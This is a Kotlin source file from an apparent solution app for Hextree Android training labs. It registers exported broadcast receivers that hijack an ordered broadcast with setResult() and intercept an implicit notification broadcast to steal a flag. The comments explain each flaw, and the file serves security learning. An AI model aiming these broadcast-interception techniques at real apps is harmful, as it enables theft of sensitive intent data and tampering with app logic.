package com.vishal2376.hextreepoc

/**
 * Author: Vishal Singh (vishal2376)
 */


import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.util.Log

/**
 * Each flag's receiver is its own separate object below.
 * registerAll() turns all of them on, unregisterAll() turns all of them off.
 */
object DynamicReceivers {

	private const val TAG = "@@@"
	private val activeReceivers = mutableListOf<BroadcastReceiver>()

	/**
	 * FLAG 18 - Hijack Broadcast Intent
	 * Technique: Ordered broadcast interception + setResult()
	 *
	 * Flow:
	 * 1. Flag18Activity sends ordered broadcast with its own receiver as the
	 *    final callback (always runs last, regardless of priority)
	 * 2. Final callback checks "if (resultCode != 0) success()"
	 * 3. We register for the same action, running before that final callback
	 * 4. We call setResult() with a non-zero code -> success() fires
	 *
	 * Key insight: resultReceiver param always runs last by design - no
	 * priority tricks needed, just exist in the chain and set a result.
	 */
	private val flag18Receiver = object : BroadcastReceiver() {
		override fun onReceive(context: Context, intent: Intent) {
			Utils.dumpIntent(context, intent, "Flag 18")
			setResult(Activity.RESULT_OK, "anything_here", null)
		}
	}

	/**
	 * FLAG 21 - Hijack Notification Button
	 * Technique: Implicit broadcast interception via PendingIntent.getBroadcast()
	 *
	 * Flow:
	 * 1. Flag21Activity posts a notification with a "Give Flag" button
	 * 2. That button's PendingIntent wraps an IMPLICIT intent (no setComponent)
	 *    containing the real decrypted flag in a "flag" extra
	 * 3. Because it's implicit, the broadcast is one-to-many - ANY app
	 *    registered for action "io.hextree.broadcast.GIVE_FLAG" receives it too
	 * 4. We register for the same action to steal the real flag content
	 *
	 * Key insight: the PendingIntent should have been explicit (setComponent) -
	 * using an implicit intent here means the "button press" broadcast leaks
	 * to every matching receiver on the device, not just Flag21Activity's own.
	 */
	private val flag21Receiver = object : BroadcastReceiver() {
		override fun onReceive(context: Context, intent: Intent) {
			Utils.dumpIntent(context, intent, "Flag 21")
		}
	}

	// Pair each receiver with the action(s) it should listen for
	private fun all(): List<Pair<BroadcastReceiver, IntentFilter>> = listOf(
		flag18Receiver to IntentFilter("io.hextree.broadcast.FREE_FLAG"),
		flag21Receiver to IntentFilter("io.hextree.broadcast.GIVE_FLAG")
	)

	// ───────────────────────────────────────────────

	@SuppressLint("UnspecifiedRegisterReceiverFlag")
	fun registerAll(context: Context) {
		all().forEach { (receiver, filter) ->
			context.registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)

			activeReceivers.add(receiver)
		}
		Log.d(TAG, "Registered ${activeReceivers.size} receivers")
	}

	fun unregisterAll(context: Context) {
		activeReceivers.forEach {
			try {
				context.unregisterReceiver(it)
			} catch (e: IllegalArgumentException) {
				// already unregistered - ignore
			}
		}
		activeReceivers.clear()
		Log.d(TAG, "Unregistered all receivers")
	}
}